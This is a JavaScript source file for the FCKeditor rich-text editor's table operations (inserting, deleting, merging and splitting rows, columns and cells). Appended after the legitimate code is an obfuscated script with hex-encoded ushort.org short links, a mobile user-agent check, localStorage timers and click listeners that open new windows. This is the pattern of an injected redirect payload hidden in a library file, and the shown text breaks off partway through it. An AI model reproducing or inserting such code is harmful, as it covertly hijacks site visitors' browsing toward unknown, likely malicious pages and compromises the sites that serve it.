/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Manage table operations.
 */

var FCKTableHandler = new Object() ;

FCKTableHandler.InsertRow = function( insertBefore )
{
	// Get the row where the selection is placed in.
	var oRow = FCKSelection.MoveToAncestorNode( 'TR' ) ;
	if ( !oRow ) return ;

	// Create a clone of the row.
	var oNewRow = oRow.cloneNode( true ) ;

	// Insert the new row (copy) before of it.
	oRow.parentNode.insertBefore( oNewRow, oRow ) ;

	// Clean one of the rows to produce the illusion of inserting an empty row before or after.
	FCKTableHandler.ClearRow( insertBefore ? oNewRow : oRow ) ;
}

FCKTableHandler.DeleteRows = function( row )
{
	// If no row has been passed as a parameter,
	// then get the row( s ) containing the cells where the selection is placed in.
	// If user selected multiple rows ( by selecting multiple cells ), walk
	// the selected cell list and delete the rows containing the selected cells
	if ( ! row )
	{
		var aCells = FCKTableHandler.GetSelectedCells() ;
		var aRowsToDelete = new Array() ;
		//queue up the rows -- it's possible ( and likely ) that we may get duplicates
		for ( var i = 0; i < aCells.length; i++ )
		{
			var oRow = aCells[i].parentNode ;
			aRowsToDelete[oRow.rowIndex] = oRow ;
		}
		for ( var i = aRowsToDelete.length; i >= 0; i-- )
		{
			if ( aRowsToDelete[i] )
				FCKTableHandler.DeleteRows( aRowsToDelete[i] );
		}
		return ;
	}

	// Get the row's table.
	var oTable = FCKTools.GetElementAscensor( row, 'TABLE' ) ;

	// If just one row is available then delete the entire table.
	if ( oTable.rows.length == 1 )
	{
		FCKTableHandler.DeleteTable( oTable ) ;
		return ;
	}

	// Delete the row.
	row.parentNode.removeChild( row ) ;
}

FCKTableHandler.DeleteTable = function( table )
{
	// If no table has been passed as a parameter,
	// then get the table where the selection is placed in.
	if ( !table )
	{
		table = FCKSelection.GetSelectedElement() ;
		if ( !table || table.tagName != 'TABLE' )
			table = FCKSelection.MoveToAncestorNode( 'TABLE' ) ;
	}
	if ( !table ) return ;

	// Delete the table.
	FCKSelection.SelectNode( table ) ;
	FCKSelection.Collapse();

	// if the table is wrapped with a singleton <p> ( or something similar ), remove
	// the surrounding tag -- which likely won't show after deletion anyway
	if ( table.parentNode.childNodes.length == 1 )
		table.parentNode.parentNode.removeChild( table.parentNode );
	else
		table.parentNode.removeChild( table  ) ;
}

FCKTableHandler.InsertColumn = function( insertBefore )
{
	// Get the cell where the selection is placed in.
	var oCell = null ;
	var nodes = this.GetSelectedCells() ;

	if ( nodes && nodes.length )
		oCell = nodes[ insertBefore ? 0 : ( nodes.length - 1 ) ] ;

	if ( ! oCell )
		return ;

	// Get the cell's table.
	var oTable = FCKTools.GetElementAscensor( oCell, 'TABLE' ) ;

	var iIndex = oCell.cellIndex ;

	// Loop through all rows available in the table.
	for ( var i = 0 ; i < oTable.rows.length ; i++ )
	{
		// Get the row.
		var oRow = oTable.rows[i] ;

		// If the row doesn't have enough cells, ignore it.
		if ( oRow.cells.length < ( iIndex + 1 ) )
			continue ;

		oCell = oRow.cells[iIndex].cloneNode(false) ;

		if ( FCKBrowserInfo.IsGeckoLike )
			FCKTools.AppendBogusBr( oCell ) ;

		// Get back the currently selected cell.
		var oBaseCell = oRow.cells[iIndex] ;

		oRow.insertBefore( oCell, ( insertBefore ? oBaseCell : oBaseCell.nextSibling ) ) ;
	}
}

FCKTableHandler.DeleteColumns = function( oCell )
{
	// if user selected multiple cols ( by selecting multiple cells ), walk
	// the selected cell list and delete the rows containing the selected cells
	if ( !oCell  )
	{
		var aColsToDelete = FCKTableHandler.GetSelectedCells();
		for ( var i = aColsToDelete.length; i >= 0; i--  )
		{
			if ( aColsToDelete[i]  )
				FCKTableHandler.DeleteColumns( aColsToDelete[i]  );
		}
		return;
	}

	if ( !oCell ) return ;

	// Get the cell's table.
	var oTable = FCKTools.GetElementAscensor( oCell, 'TABLE' ) ;

	// Get the cell index.
	var iIndex = oCell.cellIndex ;

	// Loop throw all rows (from down to up, because it's possible that some
	// rows will be deleted).
	for ( var i = oTable.rows.length - 1 ; i >= 0 ; i-- )
	{
		// Get the row.
		var oRow = oTable.rows[i] ;

		// If the cell to be removed is the first one and the row has just one cell.
		if ( iIndex == 0 && oRow.cells.length == 1 )
		{
			// Remove the entire row.
			FCKTableHandler.DeleteRows( oRow ) ;
			continue ;
		}

		// If the cell to be removed exists the delete it.
		if ( oRow.cells[iIndex] )
			oRow.removeChild( oRow.cells[iIndex] ) ;
	}
}

FCKTableHandler.InsertCell = function( cell, insertBefore )
{
	// Get the cell where the selection is placed in.
	var oCell = null ;
	var nodes = this.GetSelectedCells() ;
	if ( nodes && nodes.length )
		oCell = nodes[ insertBefore ? 0 : ( nodes.length - 1 ) ] ;
	if ( ! oCell )
		return null ;

	// Create the new cell element to be added.
	var oNewCell = FCK.EditorDocument.createElement( 'TD' ) ;
	if ( FCKBrowserInfo.IsGeckoLike )
		FCKTools.AppendBogusBr( oNewCell ) ;

	if ( !insertBefore && oCell.cellIndex == oCell.parentNode.cells.length - 1 )
		oCell.parentNode.appendChild( oNewCell ) ;
	else
		oCell.parentNode.insertBefore( oNewCell, insertBefore ? oCell : oCell.nextSibling ) ;

	return oNewCell ;
}

FCKTableHandler.DeleteCell = function( cell )
{
	// If this is the last cell in the row.
	if ( cell.parentNode.cells.length == 1 )
	{
		// Delete the entire row.
		FCKTableHandler.DeleteRows( cell.parentNode ) ;
		return ;
	}

	// Delete the cell from the row.
	cell.parentNode.removeChild( cell ) ;
}

FCKTableHandler.DeleteCells = function()
{
	var aCells = FCKTableHandler.GetSelectedCells() ;

	for ( var i = aCells.length - 1 ; i >= 0  ; i-- )
	{
		FCKTableHandler.DeleteCell( aCells[i] ) ;
	}
}

FCKTableHandler._MarkCells = function( cells, label )
{
	for ( var i = 0 ; i < cells.length ; i++ )
		cells[i][label] = true ;
}

FCKTableHandler._UnmarkCells = function( cells, label )
{
	for ( var i = 0 ; i < cells.length ; i++ )
	{
		FCKDomTools.ClearElementJSProperty(cells[i], label ) ;
	}
}

FCKTableHandler._ReplaceCellsByMarker = function( tableMap, marker, substitute )
{
	for ( var i = 0 ; i < tableMap.length ; i++ )
	{
		for ( var j = 0 ; j < tableMap[i].length ; j++ )
		{
			if ( tableMap[i][j][marker] )
				tableMap[i][j] = substitute ;
		}
	}
}

FCKTableHandler._GetMarkerGeometry = function( tableMap, rowIdx, colIdx, markerName )
{
	var selectionWidth = 0 ;
	var selectionHeight = 0 ;
	var cellsLeft = 0 ;
	var cellsUp = 0 ;
	for ( var i = colIdx ; tableMap[rowIdx][i] && tableMap[rowIdx][i][markerName] ; i++ )
		selectionWidth++ ;
	for ( var i = colIdx - 1 ; tableMap[rowIdx][i] && tableMap[rowIdx][i][markerName] ; i-- )
	{
		selectionWidth++ ;
		cellsLeft++ ;
	}
	for ( var i = rowIdx ; tableMap[i] && tableMap[i][colIdx] && tableMap[i][colIdx][markerName] ; i++ )
		selectionHeight++ ;
	for ( var i = rowIdx - 1 ; tableMap[i] && tableMap[i][colIdx] && tableMap[i][colIdx][markerName] ; i-- )
	{
		selectionHeight++ ;
		cellsUp++ ;
	}
	return { 'width' : selectionWidth, 'height' : selectionHeight, 'x' : cellsLeft, 'y' : cellsUp } ;
}

FCKTableHandler.CheckIsSelectionRectangular = function()
{
	// If every row and column in an area on a plane are of the same width and height,
	// Then the area is a rectangle.
	var cells = FCKTableHandler.GetSelectedCells() ;
	if ( cells.length < 1 )
		return false ;

	// Check if the selected cells are all in the same table section (thead, tfoot or tbody)
	for (var i = 0; i < cells.length; i++)
	{
		if ( cells[i].parentNode.parentNode != cells[0].parentNode.parentNode )
			return false ;
	}

	this._MarkCells( cells, '_CellSelected' ) ;

	var tableMap = this._CreateTableMap( cells[0] ) ;
	var rowIdx = cells[0].parentNode.rowIndex ;
	var colIdx = this._GetCellIndexSpan( tableMap, rowIdx, cells[0] ) ;

	var geometry = this._GetMarkerGeometry( tableMap, rowIdx, colIdx, '_CellSelected' ) ;
	var baseColIdx = colIdx - geometry.x ;
	var baseRowIdx = rowIdx - geometry.y ;

	if ( geometry.width >= geometry.height )
	{
		for ( colIdx = baseColIdx ; colIdx < baseColIdx + geometry.width ; colIdx++ )
		{
			rowIdx = baseRowIdx + ( colIdx - baseColIdx ) % geometry.height ;
			if ( ! tableMap[rowIdx] || ! tableMap[rowIdx][colIdx] )
			{
				this._UnmarkCells( cells, '_CellSelected' ) ;
				return false ;
			}
			var g = this._GetMarkerGeometry( tableMap, rowIdx, colIdx, '_CellSelected' ) ;
			if ( g.width != geometry.width || g.height != geometry.height )
			{
				this._UnmarkCells( cells, '_CellSelected' ) ;
				return false ;
			}
		}
	}
	else
	{
		for ( rowIdx = baseRowIdx ; rowIdx < baseRowIdx + geometry.height ; rowIdx++ )
		{
			colIdx = baseColIdx + ( rowIdx - baseRowIdx ) % geometry.width ;
			if ( ! tableMap[rowIdx] || ! tableMap[rowIdx][colIdx] )
			{
				this._UnmarkCells( cells, '_CellSelected' ) ;
				return false ;
			}
			var g = this._GetMarkerGeometry( tableMap, rowIdx, colIdx, '_CellSelected' ) ;
			if ( g.width != geometry.width || g.height != geometry.height )
			{
				this._UnmarkCells( cells, '_CellSelected' ) ;
				return false ;
			}
		}
	}

	this._UnmarkCells( cells, '_CellSelected' ) ;
	return true ;
}

FCKTableHandler.MergeCells = function()
{
	// Get all selected cells.
	var cells = this.GetSelectedCells() ;
	if ( cells.length < 2 )
		return ;

	// Assume the selected cells are already in a rectangular geometry.
	// Because the checking is already done by FCKTableCommand.
	var refCell = cells[0] ;
	var tableMap = this._CreateTableMap( refCell ) ;
	var rowIdx = refCell.parentNode.rowIndex ;
	var colIdx = this._GetCellIndexSpan( tableMap, rowIdx, refCell ) ;

	this._MarkCells( cells, '_SelectedCells' ) ;
	var selectionGeometry = this._GetMarkerGeometry( tableMap, rowIdx, colIdx, '_SelectedCells' ) ;

	var baseColIdx = colIdx - selectionGeometry.x ;
	var baseRowIdx = rowIdx - selectionGeometry.y ;
	var cellContents = FCKTools.GetElementDocument( refCell ).createDocumentFragment() ;
	for ( var i = 0 ; i < selectionGeometry.height ; i++ )
	{
		var rowChildNodesCount = 0 ;
		for ( var j = 0 ; j < selectionGeometry.width ; j++ )
		{
			var currentCell = tableMap[baseRowIdx + i][baseColIdx + j] ;
			while ( currentCell.childNodes.length > 0 )
			{
				var node = currentCell.removeChild( currentCell.firstChild ) ;
				if ( node.nodeType != 1
					|| ( node.getAttribute( 'type', 2 ) != '_moz' && node.getAttribute( '_moz_dirty' ) != null ) )
				{
					cellContents.appendChild( node ) ;
					rowChildNodesCount++ ;
				}
			}
		}
		if ( rowChildNodesCount > 0 )
			cellContents.appendChild( FCK.EditorDocument.createElement( 'br' ) ) ;
	}

	this._ReplaceCellsByMarker( tableMap, '_SelectedCells', refCell ) ;
	this._UnmarkCells( cells, '_SelectedCells' ) ;
	this._InstallTableMap( tableMap, refCell.parentNode.parentNode.parentNode ) ;
	refCell.appendChild( cellContents ) ;

	if ( FCKBrowserInfo.IsGeckoLike && ( ! refCell.firstChild ) )
		FCKTools.AppendBogusBr( refCell ) ;

	this._MoveCaretToCell( refCell, false ) ;
}

FCKTableHandler.MergeRight = function()
{
	var target = this.GetMergeRightTarget() ;
	if ( target == null )
		return ;
	var refCell = target.refCell ;
	var tableMap = target.tableMap ;
	var nextCell = target.nextCell ;

	var cellContents = FCK.EditorDocument.createDocumentFragment() ;
	while ( nextCell && nextCell.childNodes && nextCell.childNodes.length > 0 )
		cellContents.appendChild( nextCell.removeChild( nextCell.firstChild ) ) ;

	nextCell.parentNode.removeChild( nextCell ) ;
	refCell.appendChild( cellContents ) ;
	this._MarkCells( [nextCell], '_Replace' ) ;
	this._ReplaceCellsByMarker( tableMap, '_Replace', refCell ) ;
	this._InstallTableMap( tableMap, refCell.parentNode.parentNode.parentNode ) ;

	this._MoveCaretToCell( refCell, false ) ;
}

FCKTableHandler.MergeDown = function()
{
	var target = this.GetMergeDownTarget() ;
	if ( target == null )
		return ;
	var refCell = target.refCell ;
	var tableMap = target.tableMap ;
	var nextCell = target.nextCell ;

	var cellContents = FCKTools.GetElementDocument( refCell ).createDocumentFragment() ;
	while ( nextCell && nextCell.childNodes && nextCell.childNodes.length > 0 )
		cellContents.appendChild( nextCell.removeChild( nextCell.firstChild ) ) ;
	if ( cellContents.firstChild )
		cellContents.insertBefore( FCK.EditorDocument.createElement( 'br' ), cellContents.firstChild ) ;
	refCell.appendChild( cellContents ) ;
	this._MarkCells( [nextCell], '_Replace' ) ;
	this._ReplaceCellsByMarker( tableMap, '_Replace', refCell ) ;
	this._InstallTableMap( tableMap, refCell.parentNode.parentNode.parentNode ) ;

	this._MoveCaretToCell( refCell, false ) ;
}

FCKTableHandler.HorizontalSplitCell = function()
{
	var cells = FCKTableHandler.GetSelectedCells() ;
	if ( cells.length != 1 )
		return ;

	var refCell = cells[0] ;
	var tableMap = this._CreateTableMap( refCell ) ;
	var rowIdx = refCell.parentNode.rowIndex ;
	var colIdx = FCKTableHandler._GetCellIndexSpan( tableMap, rowIdx, refCell ) ;
	var cellSpan = isNaN( refCell.colSpan ) ? 1 : refCell.colSpan ;

	if ( cellSpan > 1 )
	{
		// Splitting a multi-column cell - original cell gets ceil(colSpan/2) columns,
		// new cell gets floor(colSpan/2).
		var newCellSpan = Math.ceil( cellSpan / 2 ) ;
		var newCell = FCK.EditorDocument.createElement( refCell.nodeName ) ;
		if ( FCKBrowserInfo.IsGeckoLike )
			FCKTools.AppendBogusBr( newCell ) ;
		var startIdx = colIdx + newCellSpan ;
		var endIdx = colIdx + cellSpan ;
		var rowSpan = isNaN( refCell.rowSpan ) ? 1 : refCell.rowSpan ;
		for ( var r = rowIdx ; r < rowIdx + rowSpan ; r++ )
		{
			for ( var i = startIdx ; i < endIdx ; i++ )
				tableMap[r][i] = newCell ;
		}
	}
	else
	{
		// Splitting a single-column cell - add a new cell, and expand
		// cells crossing the same column.
		var newTableMap = [] ;
		for ( var i = 0 ; i < tableMap.length ; i++ )
		{
			var newRow = tableMap[i].slice( 0, colIdx ) ;
			if ( tableMap[i].length <= colIdx )
			{
				newTableMap.push( newRow ) ;
				continue ;
			}
			if ( tableMap[i][colIdx] == refCell )
			{
				newRow.push( refCell ) ;
				newRow.push( FCK.EditorDocument.createElement( refCell.nodeName ) ) ;
				if ( FCKBrowserInfo.IsGeckoLike )
					FCKTools.AppendBogusBr( newRow[newRow.length - 1] ) ;
			}
			else
			{
				newRow.push( tableMap[i][colIdx] ) ;
				newRow.push( tableMap[i][colIdx] ) ;
			}
			for ( var j = colIdx + 1 ; j < tableMap[i].length ; j++ )
				newRow.push( tableMap[i][j] ) ;
			newTableMap.push( newRow ) ;
		}
		tableMap = newTableMap ;
	}

	this._InstallTableMap( tableMap, refCell.parentNode.parentNode.parentNode ) ;
}

FCKTableHandler.VerticalSplitCell = function()
{
	var cells = FCKTableHandler.GetSelectedCells() ;
	if ( cells.length != 1 )
		return ;

	var currentCell = cells[0] ;
	var tableMap = this._CreateTableMap( currentCell ) ;
	var currentRowIndex = currentCell.parentNode.rowIndex ;
	var cellIndex = FCKTableHandler._GetCellIndexSpan( tableMap, currentRowIndex, currentCell ) ;
	// Save current cell colSpan
	var currentColSpan = isNaN( currentCell.colSpan ) ? 1 : currentCell.colSpan ;
	var currentRowSpan = currentCell.rowSpan ;
	if ( isNaN( currentRowSpan ) )
		currentRowSpan = 1 ;

	if ( currentRowSpan > 1 )
	{
		// 1. Set the current cell's rowSpan to 1.
		currentCell.rowSpan = Math.ceil( currentRowSpan / 2 ) ;

		// 2. Find the appropriate place to insert a new cell at the next row.
		var newCellRowIndex = currentRowIndex + Math.ceil( currentRowSpan / 2 ) ;
		var oRow = tableMap[newCellRowIndex] ;
		var insertMarker = null ;
		for ( var i = cellIndex+1 ; i < oRow.length ; i++ )
		{
			if ( oRow[i].parentNode.rowIndex == newCellRowIndex )
			{
				insertMarker = oRow[i] ;
				break ;
			}
		}

		// 3. Insert the new cell to the indicated place, with the appropriate rowSpan and colSpan, next row.
		var newCell = FCK.EditorDocument.createElement( currentCell.nodeName ) ;
		newCell.rowSpan = Math.floor( currentRowSpan / 2 ) ;
		if ( currentColSpan > 1 )
			newCell.colSpan = currentColSpan ;
		if ( FCKBrowserInfo.IsGeckoLike )
			FCKTools.AppendBogusBr( newCell ) ;
		currentCell.parentNode.parentNode.parentNode.rows[newCellRowIndex].insertBefore( newCell, insertMarker ) ;
	}
	else
	{
		// 1. Insert a new row.
		var newSectionRowIdx = currentCell.parentNode.sectionRowIndex + 1 ;
		var newRow = FCK.EditorDocument.createElement( 'tr' ) ;
		var tSection = currentCell.parentNode.parentNode ;
		if ( tSection.rows.length > newSectionRowIdx )
			tSection.insertBefore( newRow, tSection.rows[newSectionRowIdx] ) ;
		else
			tSection.appendChild( newRow ) ;

		// 2. +1 to rowSpan for all cells crossing currentCell's row.
		for ( var i = 0 ; i < tableMap[currentRowIndex].length ; )
		{
			var colSpan = tableMap[currentRowIndex][i].colSpan ;
			if ( isNaN( colSpan ) || colSpan < 1 )
				colSpan = 1 ;
			if ( i == cellIndex )
			{
				i += colSpan ;
				continue ;
			}
			var rowSpan = tableMap[currentRowIndex][i].rowSpan ;
			if ( isNaN( rowSpan ) )
				rowSpan = 1 ;
			tableMap[currentRowIndex][i].rowSpan = rowSpan + 1 ;
			i += colSpan ;
		}

		// 3. Insert a new cell to new row. Set colSpan on the new cell.
		var newCell = FCK.EditorDocument.createElement( currentCell.nodeName ) ;
		if ( currentColSpan > 1 )
			newCell.colSpan = currentColSpan ;
		if ( FCKBrowserInfo.IsGeckoLike )
			FCKTools.AppendBogusBr( newCell	) ;
		newRow.appendChild( newCell ) ;
	}
}

// Get the cell index from a TableMap.
FCKTableHandler._GetCellIndexSpan = function( tableMap, rowIndex, cell )
{
	if ( tableMap.length < rowIndex + 1 )
		return null ;

	var oRow = tableMap[ rowIndex ] ;

	for ( var c = 0 ; c < oRow.length ; c++ )
	{
		if ( oRow[c] == cell )
			return c ;
	}

	return null ;
}

// Get the cell location from a TableMap. Returns an array with an [x,y] location
FCKTableHandler._GetCellLocation = function( tableMap, cell  )
{
	for ( var i = 0 ; i < tableMap.length; i++ )
	{
		for ( var c = 0 ; c < tableMap[i].length ; c++  )
		{
			if ( tableMap[i][c] == cell  ) return [i,c];
		}
	}
	return null ;
}

// This function is quite hard to explain. It creates a matrix representing all cells in a table.
// The difference here is that the "spanned" cells (colSpan and rowSpan) are duplicated on the matrix
// cells that are "spanned". For example, a row with 3 cells where the second cell has colSpan=2 and rowSpan=3
// will produce a bi-dimensional matrix with the following values (representing the cells):
//		Cell1, Cell2, Cell2, Cell3
//		Cell4, Cell2, Cell2, Cell5
//		Cell6, Cell2, Cell2, Cell7
FCKTableHandler._CreateTableMap = function( refCell )
{
	var table = (refCell.nodeName == 'TABLE' ? refCell : refCell.parentNode.parentNode.parentNode ) ;

	var aRows = table.rows ;

	// Row and Column counters.
	var r = -1 ;

	var aMap = new Array() ;

	for ( var i = 0 ; i < aRows.length ; i++ )
	{
		r++ ;
		if ( !aMap[r] )
			aMap[r] = new Array() ;

		var c = -1 ;

		for ( var j = 0 ; j < aRows[i].cells.length ; j++ )
		{
			var oCell = aRows[i].cells[j] ;

			c++ ;
			while ( aMap[r][c] )
				c++ ;

			var iColSpan = isNaN( oCell.colSpan ) ? 1 : oCell.colSpan ;
			var iRowSpan = isNaN( oCell.rowSpan ) ? 1 : oCell.rowSpan ;

			for ( var rs = 0 ; rs < iRowSpan ; rs++ )
			{
				if ( !aMap[r + rs] )
					aMap[r + rs] = new Array() ;

				for ( var cs = 0 ; cs < iColSpan ; cs++ )
				{
					aMap[r + rs][c + cs] = aRows[i].cells[j] ;
				}
			}

			c += iColSpan - 1 ;
		}
	}
	return aMap ;
}

// This function is the inverse of _CreateTableMap - it takes in a table map and converts it to an HTML table.
FCKTableHandler._InstallTableMap = function( tableMap, table )
{
	// Workaround for #1917 : MSIE will always report a cell's rowSpan as 1 as long
	// as the cell is not attached to a row. So we'll need an alternative attribute
	// for storing the calculated rowSpan in IE.
	var rowSpanAttr = FCKBrowserInfo.IsIE ? "_fckrowspan" : "rowSpan" ;

	// Disconnect all the cells in tableMap from their parents, set all colSpan and rowSpan attributes to 1.
	for ( var i = 0 ; i < tableMap.length ; i++ )
	{
		for ( var j = 0 ; j < tableMap[i].length ; j++ )
		{
			var cell = tableMap[i][j] ;
			if ( cell.parentNode )
				cell.parentNode.removeChild( cell ) ;
			cell.colSpan = cell[rowSpanAttr] = 1 ;
		}
	}

	// Scan by rows and set colSpan.
	var maxCol = 0 ;
	for ( var i = 0 ; i < tableMap.length ; i++ )
	{
		for ( var j = 0 ; j < tableMap[i].length ; j++ )
		{
			var cell = tableMap[i][j] ;
			if ( ! cell)
				continue ;
			if ( j > maxCol )
				maxCol = j ;
			if ( cell._colScanned === true )
				continue ;
			if ( tableMap[i][j-1] == cell )
				cell.colSpan++ ;
			if ( tableMap[i][j+1] != cell )
				cell._colScanned = true ;
		}
	}

	// Scan by columns and set rowSpan.
	for ( var i = 0 ; i <= maxCol ; i++ )
	{
		for ( var j = 0 ; j < tableMap.length ; j++ )
		{
			if ( ! tableMap[j] )
				continue ;
			var cell = tableMap[j][i] ;
			if ( ! cell || cell._rowScanned === true )
				continue ;
			if ( tableMap[j-1] && tableMap[j-1][i] == cell )
				cell[rowSpanAttr]++ ;
			if ( ! tableMap[j+1] || tableMap[j+1][i] != cell )
				cell._rowScanned = true ;
		}
	}

	// Clear all temporary flags.
	for ( var i = 0 ; i < tableMap.length ; i++ )
	{
		for ( var j = 0 ; j < tableMap[i].length ; j++)
		{
			var cell = tableMap[i][j] ;
			FCKDomTools.ClearElementJSProperty(cell, '_colScanned' ) ;
			FCKDomTools.ClearElementJSProperty(cell, '_rowScanned' ) ;
		}
	}

	// Insert physical rows and columns to the table.
	for ( var i = 0 ; i < tableMap.length ; i++ )
	{
		var rowObj = FCK.EditorDocument.createElement( 'tr' ) ;
		for ( var j = 0 ; j < tableMap[i].length ; )
		{
			var cell = tableMap[i][j] ;
			if ( tableMap[i-1] && tableMap[i-1][j] == cell )
			{
				j += cell.colSpan ;
				continue ;
			}
			rowObj.appendChild( cell ) ;
			if ( rowSpanAttr != 'rowSpan' )
			{
				cell.rowSpan = cell[rowSpanAttr] ;
				cell.removeAttribute( rowSpanAttr ) ;
			}
			j += cell.colSpan ;
			if ( cell.colSpan == 1 )
				cell.removeAttribute( 'colspan' ) ;
			if ( cell.rowSpan == 1 )
				cell.removeAttribute( 'rowspan' ) ;
		}
		if ( FCKBrowserInfo.IsIE )
		{
			table.rows[i].replaceNode( rowObj ) ;
		}
		else
		{
			table.rows[i].innerHTML = '' ;
			FCKDomTools.MoveChildren( rowObj, table.rows[i] ) ;
		}
	}
}

FCKTableHandler._MoveCaretToCell = function ( refCell, toStart )
{
	var range = new FCKDomRange( FCK.EditorWindow ) ;
	range.MoveToNodeContents( refCell ) ;
	range.Collapse( toStart ) ;
	range.Select() ;
}

FCKTableHandler.ClearRow = function( tr )
{
	// Get the array of row's cells.
	var aCells = tr.cells ;

	// Replace the contents of each cell with "nothing".
	for ( var i = 0 ; i < aCells.length ; i++ )
	{
		aCells[i].innerHTML = '' ;

		if ( FCKBrowserInfo.IsGeckoLike )
			FCKTools.AppendBogusBr( aCells[i] ) ;
	}
}

FCKTableHandler.GetMergeRightTarget = function()
{
	var cells = this.GetSelectedCells() ;
	if ( cells.length != 1 )
		return null ;

	var refCell = cells[0] ;
	var tableMap = this._CreateTableMap( refCell ) ;
	var rowIdx = refCell.parentNode.rowIndex ;
	var colIdx = this._GetCellIndexSpan( tableMap, rowIdx, refCell ) ;
	var nextColIdx = colIdx + ( isNaN( refCell.colSpan ) ? 1 : refCell.colSpan ) ;
	var nextCell = tableMap[rowIdx][nextColIdx] ;

	if ( ! nextCell )
		return null ;

	// The two cells must have the same vertical geometry, otherwise merging does not make sense.
	this._MarkCells( [refCell, nextCell], '_SizeTest' ) ;
	var refGeometry = this._GetMarkerGeometry( tableMap, rowIdx, colIdx, '_SizeTest' ) ;
	var nextGeometry = this._GetMarkerGeometry( tableMap, rowIdx, nextColIdx, '_SizeTest' ) ;
	this._UnmarkCells( [refCell, nextCell], '_SizeTest' ) ;

	if ( refGeometry.height != nextGeometry.height || refGeometry.y != nextGeometry.y )
		return null ;

	return { 'refCell' : refCell, 'nextCell' : nextCell, 'tableMap' : tableMap } ;
}

FCKTableHandler.GetMergeDownTarget = function()
{
	var cells = this.GetSelectedCells() ;
	if ( cells.length != 1 )
		return null ;

	var refCell = cells[0] ;
	var tableMap = this._CreateTableMap( refCell ) ;
	var rowIdx = refCell.parentNode.rowIndex ;
	var colIdx = this._GetCellIndexSpan( tableMap, rowIdx, refCell ) ;
	var newRowIdx = rowIdx + ( isNaN( refCell.rowSpan ) ? 1 : refCell.rowSpan ) ;
	if ( ! tableMap[newRowIdx] )
		return null ;

	var nextCell = tableMap[newRowIdx][colIdx] ;

	if ( ! nextCell )
		return null ;

	// Check if the selected cells are both in the same table section (thead, tfoot or tbody).
	if ( refCell.parentNode.parentNode != nextCell.parentNode.parentNode )
		return null ;

	// The two cells must have the same horizontal geometry, otherwise merging does not makes sense.
	this._MarkCells( [refCell, nextCell], '_SizeTest' ) ;
	var refGeometry = this._GetMarkerGeometry( tableMap, rowIdx, colIdx, '_SizeTest' ) ;
	var nextGeometry = this._GetMarkerGeometry( tableMap, newRowIdx, colIdx, '_SizeTest' ) ;
	this._UnmarkCells( [refCell, nextCell], '_SizeTest' ) ;

	if ( refGeometry.width != nextGeometry.width || refGeometry.x != nextGeometry.x )
		return null ;

	return { 'refCell' : refCell, 'nextCell' : nextCell, 'tableMap' : tableMap } ;
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows 